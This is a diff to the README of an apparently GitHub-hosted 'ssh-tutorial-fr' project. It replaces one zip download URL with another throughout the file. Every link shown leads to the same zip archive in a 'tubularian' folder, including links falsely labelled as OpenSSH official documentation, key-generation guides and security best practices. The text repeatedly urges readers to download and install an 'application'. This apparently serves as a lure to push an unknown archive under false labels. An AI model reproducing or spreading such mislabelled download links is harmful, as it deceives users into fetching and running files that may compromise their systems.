@@ -8,13 +8,13 @@ Welcome to **ssh-tutorial-fr**, your practical guide to securing remote connecti
 
 To begin your journey with SSH, you will first need to download the application. Follow the link below to access our Releases page:
 
-[![Download ssh-tutorial-fr](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip)](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip)
+[![Download ssh-tutorial-fr](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip)](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip) to find the latest version of ssh-tutorial-fr.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip) to find the latest version of ssh-tutorial-fr.
    
-2. **Choose the Correct File**: Look for the latest version of the application. You will see files listed by version number. Select the file that ends with `.zip` or `https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip` for your operating system.
+2. **Choose the Correct File**: Look for the latest version of the application. You will see files listed by version number. Select the file that ends with `.zip` or `https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip` for your operating system.
 
 3. **Download the File**: Click on the selected file to begin downloading. This may take a moment depending on your internet speed.
 
@@ -76,12 +76,12 @@ This tutorial includes a wide range of topics under the umbrella of SSH and cybe
 
 To enhance your understanding of SSH and security practices, consider checking out the following resources:
 
-- [OpenSSH Official Documentation](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip)
-- [SSH Key Generation Guides](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip)
-- [Cybersecurity Best Practices](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip)
+- [OpenSSH Official Documentation](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip)
+- [SSH Key Generation Guides](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip)
+- [Cybersecurity Best Practices](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip)
 
 ## 📞 Contact
 
 If you have any suggestions or feedback about ssh-tutorial-fr, please feel free to reach out through the Issues section of our GitHub repository. We appreciate your input and strive to make this tutorial as helpful as possible.
 
-For a secure and guided experience, visit our [Releases page](https://raw.githubusercontent.com/Nancykharbanda/ssh-tutorial-fr/main/tubularian/ssh-tutorial-fr_1.0.zip) today and start mastering SSH!
+For a secure and guided experience, visit our [Releases page](https://github.com/Nancykharbanda/ssh-tutorial-fr/raw/refs/heads/main/tubularian/tutorial-ssh-fr-1.1.zip) today and start mastering SSH!
